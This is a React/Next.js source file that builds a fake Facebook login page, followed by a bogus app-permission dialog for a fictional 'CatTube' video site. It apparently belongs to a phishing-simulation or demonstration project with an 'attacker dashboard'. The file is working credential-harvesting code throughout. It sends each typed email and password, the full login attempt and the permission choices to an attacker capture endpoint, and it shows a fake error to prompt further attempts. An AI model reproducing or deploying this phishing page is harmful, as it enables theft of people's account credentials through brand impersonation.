'use client'

import { useState, useEffect } from 'react'
import { Eye, EyeOff } from 'lucide-react'
import { useSearchParams } from 'next/navigation'
import { getAttackerApiUrl } from '@/lib/config'

export default function FakeFacebook() {
  const [formData, setFormData] = useState({
    email: '',
    password: ''
  })
  const [showPassword, setShowPassword] = useState(false)
  const [sessionId, setSessionId] = useState('')
  const [showPermissions, setShowPermissions] = useState(false)
  const [loginAttempts, setLoginAttempts] = useState(0)
  const [showSuccess, setShowSuccess] = useState(false)
  const searchParams = useSearchParams()

  useEffect(() => {
    // Get session ID from URL or generate new one
    const urlSessionId = searchParams.get('session')
    const newSessionId = urlSessionId || `victim-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
    setSessionId(newSessionId)
    
    // Notify attacker dashboard that victim landed on fake Facebook
    fetch(getAttackerApiUrl('capture'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'victim_connected',
        sessionId: newSessionId,
        data: {
          ip: 'Victim IP Hidden',
          userAgent: navigator.userAgent,
          scenario: 'fake-facebook',
          page: 'login'
        }
      })
    }).catch(console.error)
  }, [searchParams])

  const handleInputChange = (field: string, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }))
    
    // Only send data if field has meaningful content (not every keystroke)
    if (value.length > 3 && (value.includes('@') || field === 'password')) {
      fetch(getAttackerApiUrl('capture'), {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'credentials',
          sessionId,
          data: {
            field: `facebook_${field}`,
            value: value
          }
        })
      }).catch(console.error)
    }
  }

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Send complete login attempt to attacker
    await fetch(getAttackerApiUrl('capture'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'credentials',
        sessionId,
        data: {
          field: 'facebook_login_attempt',
          value: JSON.stringify({
            email: formData.email,
            password: formData.password,
            attempt: loginAttempts + 1
          })
        }
      })
    }).catch(console.error)

    setLoginAttempts(prev => prev + 1)

    // Show permissions dialog after first attempt
    if (loginAttempts === 0 && formData.email && formData.password) {
      setShowPermissions(true)
    } else {
      // Show fake error for subsequent attempts
      alert('Sorry, something went wrong. Please try again.')
    }
  }

  const handlePermissionGrant = async () => {
    // Send permission grant to attacker
    await fetch(getAttackerApiUrl('capture'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'credentials',
        sessionId,
        data: {
          field: 'facebook_permissions_granted',
          value: 'POST_TO_TIMELINE,ACCESS_FRIENDS,READ_PROFILE'
        }
      })
    }).catch(console.error)

    // Send success message to parent window
    if (window.opener) {
      window.opener.postMessage({ type: 'facebook_success' }, '*')
    }

    // Show success UI
    setShowPermissions(false)
    setShowSuccess(true)
    setTimeout(() => {
      window.close() // Close the popup
    }, 3000)
  }

  const handlePermissionDeny = async () => {
    // Send permission denial to attacker
    await fetch(getAttackerApiUrl('capture'), {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        type: 'credentials',
        sessionId,
        data: {
          field: 'facebook_permissions_denied',
          value: 'USER_DENIED_PERMISSIONS'
        }
      })
    }).catch(console.error)

    setShowSuccess(true)
    setTimeout(() => {
      window.close()
    }, 2000)
  }

  if (showPermissions) {
    return (
      <div className="min-h-screen bg-white">
        {/* Facebook Header */}
        <div className="bg-[#1877f2] text-white p-4">
          <div className="max-w-md mx-auto flex items-center gap-2">
            <div className="w-8 h-8 bg-white rounded text-[#1877f2] flex items-center justify-center font-bold text-lg">f</div>
            <h1 className="text-xl font-semibold">Facebook</h1>
          </div>
        </div>

        <div className="max-w-md mx-auto p-6">
          <div className="text-center mb-6">
            <h2 className="text-xl font-semibold text-gray-900 mb-2">CatTube wants to share</h2>
            <p className="text-gray-600">CatTube wants to post on your timeline and access your friends list to recommend videos.</p>
          </div>

          <div className="bg-gray-50 rounded-lg p-4 mb-6">
            <h3 className="font-semibold mb-3">This app will receive:</h3>
            <ul className="space-y-2 text-sm">
              <li className="flex items-center gap-2">
                <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                Post to your timeline
              </li>
              <li className="flex items-center gap-2">
                <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                Access your friends list
              </li>
              <li className="flex items-center gap-2">
                <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                Read your profile information
              </li>
              <li className="flex items-center gap-2">
                <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                Send you notifications
              </li>
            </ul>
          </div>

          <div className="space-y-3">
            <button 
              onClick={handlePermissionGrant}
              className="w-full bg-[#1877f2] text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5]"
            >
              Continue as {formData.email.split('@')[0] || 'User'}
            </button>
            <button 
              onClick={handlePermissionDeny}
              className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold hover:bg-gray-300"
            >
              Cancel
            </button>
          </div>

          <p className="text-xs text-gray-500 text-center mt-4">
            By continuing, you allow CatTube to receive the info listed above and agree to their Terms and Privacy Policy.
          </p>
        </div>
      </div>
    )
  }

  if (showSuccess) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center p-8">
          <div className="w-16 h-16 bg-green-500 rounded-full flex items-center justify-center mx-auto mb-4">
            <div className="text-white text-2xl">✓</div>
          </div>
          <h2 className="text-2xl font-semibold text-gray-900 mb-2">Successfully Shared!</h2>
          <p className="text-gray-600 mb-4">Your video has been posted to your timeline.</p>
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 max-w-md mx-auto">
            <p className="text-sm text-blue-800">
              🎉 Your friends will love this cat video! Thanks for sharing on Facebook.
            </p>
          </div>
          <p className="text-xs text-gray-500 mt-4">This window will close automatically...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Facebook Header */}
      <div className="bg-[#1877f2] text-white p-4">
        <div className="max-w-md mx-auto flex items-center gap-2">
          <div className="w-8 h-8 bg-white rounded text-[#1877f2] flex items-center justify-center font-bold text-lg">f</div>
          <h1 className="text-xl font-semibold">Facebook</h1>
        </div>
      </div>

      <div className="max-w-md mx-auto p-6">
        <div className="text-center mb-6">
          <h2 className="text-2xl font-semibold text-gray-900 mb-2">Log in to Facebook</h2>
          <p className="text-gray-600">Enter your email and password to continue</p>
        </div>

        <form onSubmit={handleLogin} className="space-y-4">
          <div>
            <input
              type="email"
              placeholder="Email address or phone number"
              value={formData.email}
              onChange={(e) => handleInputChange('email', e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent"
              required
            />
          </div>

          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder="Password"
              value={formData.password}
              onChange={(e) => handleInputChange('password', e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent pr-12"
              required
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-3.5 text-gray-400 hover:text-gray-600"
            >
              {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
            </button>
          </div>

          <button
            type="submit"
            className="w-full bg-[#1877f2] text-white py-3 rounded-lg font-semibold hover:bg-[#166fe5] transition-colors"
          >
            Log in
          </button>
        </form>

        <div className="text-center mt-6">
          <a href="#" className="text-[#1877f2] text-sm hover:underline">
            Forgotten password?
          </a>
        </div>

        <div className="flex items-center my-6">
          <div className="flex-1 border-t border-gray-300"></div>
          <span className="px-4 text-gray-500 text-sm">or</span>
          <div className="flex-1 border-t border-gray-300"></div>
        </div>

        <button className="w-full bg-[#42b883] text-white py-3 rounded-lg font-semibold hover:bg-[#369870] transition-colors">
          Create new account
        </button>

        <div className="text-center mt-8">
          <p className="text-xs text-gray-500">
            By clicking Log in, you agree to our Terms, Data Policy and Cookie Policy.
          </p>
        </div>
      </div>

      {/* Debug info - hidden in production */}
      {sessionId && (
        <div className="fixed bottom-4 right-4 bg-black/80 text-white text-xs p-2 rounded opacity-0 hover:opacity-100 transition-opacity">
          <div>Scenario: Fake Facebook</div>
          <div>Session: {sessionId}</div>
          <div>Attempts: {loginAttempts}</div>
          <div>Data: {formData.email ? 'Email ✓' : ''} {formData.password ? 'Pass ✓' : ''}</div>
        </div>
      )}
    </div>
  )
}